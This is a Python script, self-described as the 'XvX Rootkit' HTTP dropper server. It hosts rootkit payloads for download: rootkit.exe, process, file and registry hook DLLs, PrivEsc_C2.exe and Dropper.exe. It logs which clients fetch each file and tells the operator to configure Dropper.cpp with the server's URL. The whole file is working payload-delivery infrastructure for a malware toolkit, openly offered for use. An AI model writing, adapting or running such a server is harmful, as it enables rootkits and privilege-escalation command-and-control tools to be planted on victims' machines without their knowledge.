#!/usr/bin/env python3
"""
XvX Rootkit - HTTP Dropper Server
Copyright (c) 2025 - 28zaakypro@proton.me

Simple HTTP server for payload delivery (rootkit.exe, DLLs, PrivEsc_C2.exe).
Serves files from deploy_package/ directory.
Usage: python http_server.py [port]
"""

import http.server
import socketserver
import sys
import os
import socket
from pathlib import Path

# Port used by default
DEFAULT_PORT = 8000

# Handler that logs requests with more details
class DetailedHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        """Override to have more detailed logs"""
        client_ip = self.client_address[0]
        print(f"[{self.log_date_time_string()}] {client_ip} - {format % args}")
    
    def end_headers(self):
        """Add CORS headers to avoid blocking issues"""
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')
        super().end_headers()
    
    def do_GET(self):
        """GET handler with detailed logging"""
        file_path = self.translate_path(self.path)
        if os.path.isfile(file_path):
            file_size = os.path.getsize(file_path)
            print(f"[DOWNLOAD] {self.client_address[0]} downloading: {self.path} ({file_size} bytes)")
        else:
            print(f"[404] {self.client_address[0]} requested missing file: {self.path}")
        
        return super().do_GET()

def get_local_ip():
    """Get the primary local IP address"""
    try:
        # Create a socket to determine the local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1"

def main():
    # Retrieve port from arguments or use default
    port = DEFAULT_PORT
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except ValueError:
            print(f"Invalid port: {sys.argv[1]}, using default port {DEFAULT_PORT}")
            port = DEFAULT_PORT
    
    # Change to deploy_package directory if it exists
    deploy_dir = Path.cwd() / "deploy_package"
    if deploy_dir.exists() and deploy_dir.is_dir():
        os.chdir(deploy_dir)
        current_dir = deploy_dir
        print(f"[INFO] Serving from deploy_package/")
    else:
        current_dir = Path.cwd()
        print(f"[WARNING] deploy_package/ not found, serving from current directory")
    
    # Get local IP
    local_ip = get_local_ip()
    
    # Display served directory
    print("=" * 80)
    print("XVX ROOTKIT - HTTP PAYLOAD SERVER")
    print("=" * 80)
    print(f"Directory:       {current_dir}")
    print(f"Port:            {port}")
    print(f"Local IP:        {local_ip}")
    print(f"Local Access:    http://localhost:{port}/")
    print(f"Network Access:  http://{local_ip}:{port}/")
    print("=" * 80)
    
    # List available files
    print("\nAvailable payloads:")
    print("-" * 80)
    
    files_to_show = [
        'rootkit.exe', 
        'processHooks.dll', 
        'fileHooks.dll', 
        'registryHooks.dll',
        'PrivEsc_C2.exe',
        'Dropper.exe'
    ]
    
    for filename in files_to_show:
        file_path = current_dir / filename
        if file_path.exists():
            size_kb = file_path.stat().st_size / 1024
            if size_kb > 1024:
                size_str = f"{size_kb/1024:.2f} MB"
            else:
                size_str = f"{size_kb:.2f} KB"
            print(f"  ✓ {filename:<25} {size_str:>12}")
        else:
            print(f"  ✗ {filename:<25} {'[NOT FOUND]':>12}")
    
    print("-" * 80)
    print("\nDropper configuration:")
    print(f"  Update Dropper.cpp with: http://{local_ip}:{port}/")
    print("-" * 80)
    print("\nServer started. Press Ctrl+C to stop.")
    print("=" * 80)
    print()
    
    # Create and start the server
    try:
        with socketserver.TCPServer(("", port), DetailedHTTPRequestHandler) as httpd:
            # Allow quick reuse of the port
            httpd.allow_reuse_address = True
            
            print(f"[READY] Server listening on port {port}...\n")
            httpd.serve_forever()
            
    except KeyboardInterrupt:
        print("\n\n[SHUTDOWN] Server stopped by user.")
        sys.exit(0)
    except PermissionError:
        print(f"\n[ERROR] Permission denied for port {port}. Try a port > 1024.")
        sys.exit(1)
    except OSError as e:
        if e.errno == 48 or e.errno == 10048:  # Address already in use
            print(f"\n[ERROR] Port {port} is already in use.")
            print("Try another port or stop the process using it.")
        else:
            print(f"\n[ERROR] System error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
